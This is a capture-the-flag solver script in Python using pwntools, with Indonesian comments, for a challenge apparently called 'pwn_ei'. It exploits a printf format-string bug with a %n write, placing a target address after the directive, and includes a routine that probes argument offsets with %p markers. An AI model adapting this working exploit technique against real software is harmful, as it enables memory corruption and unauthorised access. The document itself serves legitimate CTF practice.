#!/usr/bin/env python3
"""
Solver sederhana untuk pwn_ei (TecFest 2026).

Bug      : main() memanggil printf(buf) langsung atas input user
           -> format string vulnerability.
Target   : global `access_granted` (int) di alamat 0x4040c0. Kalau nilainya
           non-zero, main() memanggil give_flag() yang fputs() isi global
           `flag` (sudah di-load dari flag.txt di awal main()).
Teknik   : %n write. Argumen ke-9 pada format string ini overlap persis
           dengan byte ke-8..15 dari buffer input kita sendiri (dicek pakai
           probing "%N$p" / marker), jadi kita taruh alamat target di sana
           lalu suruh printf nulis ke sana pakai "%9$n".

Payload  : b"AAAA" + b"%9$n" + p64(0x4040c0)
           - "AAAA"    -> 4 byte dicetak dulu supaya counter %n jadi 4 (non-zero)
           - "%9$n"    -> tulis counter itu ke alamat pada argumen #9
           - p64(addr) -> alamat access_granted, ditaruh SETELAH "%9$n" biar
                           byte NULL di dalamnya tidak memutus parsing format
                           string sebelum directive %n sempat diproses.

CATATAN PENTING (baca kalau binary/instance di-update lagi):
- Alamat `access_granted` dan `give_flag` itu FIXED karena No PIE, tapi
  BISA BERGESER kalau binary direkompilasi ulang (walau cuma diubah dikit).
  Selalu cross-check pakai `nm -C ei | grep access_granted` dulu.
- Offset argumen (`%9$n`) itu TIDAK TETAP antar instance/restart container
  -- bisa geser beberapa slot kalau argv/envp di container beda panjang,
  walau binary-nya sama persis. Selalu re-probe offset tiap kali instance
  di-restart dengan kirim "MARKER8B.%1$p.%2$p...." dan cari argumen mana
  yang hasilnya match sama 8 byte marker kita (lihat find_base_arg() di
  bawah -- aktifkan FIND_OFFSET=1 kalau mau re-probe otomatis).
"""

from pwn import *

ACCESS_GRANTED = 0x4040c0
WRITE_ARG = 9  # hasil probing: arg #9 overlap buf+8


def find_base_arg(io):
    """Opsional: re-probe offset argumen kalau instance baru di-restart."""
    marker = b"MARKERMK"
    probe = b".".join(b"%%%d$p" % i for i in range(1, 20))
    io.sendline(marker + b"." + probe)
    out = io.recvline(timeout=3)
    for i, p in enumerate(out.split(b".")[1:], start=1):
        try:
            if int(p, 16) == u64(marker):
                return i
        except ValueError:
            continue
    raise RuntimeError("tidak nemu base argumen, cek ulang payload probe")


def main():
    io = remote("localhost", 40101)
    io.recvuntil(b"> ")

    write_arg = WRITE_ARG
    if args.FIND_OFFSET:
        base = find_base_arg(io)
        write_arg = base + 1  # argumen ini overlap buf+8
        log.info(f"base_arg={base}, write_arg (buf+8)={write_arg}")

    payload = b"AAAA" + f"%{write_arg}$n".encode() + p64(ACCESS_GRANTED)
    io.sendline(payload)

    print(io.recvall(timeout=3).decode(errors="replace"))


if __name__ == "__main__":
    main()
